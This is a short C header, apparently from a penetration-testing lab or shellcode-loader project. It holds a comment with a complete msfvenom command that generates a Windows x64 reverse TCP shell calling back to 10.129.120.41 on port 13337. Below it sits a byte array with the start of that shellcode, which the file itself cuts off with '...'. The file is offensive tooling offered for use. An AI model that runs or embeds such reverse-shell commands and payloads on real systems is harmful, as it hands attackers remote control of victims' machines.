#pragma once

// msfvenom -p windows/x64/shell_reverse_tcp lhost=10.129.120.41 lport=13337 -f c
// Payload size: 460 bytes
// Final size of c file : 1957 bytes

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
"...";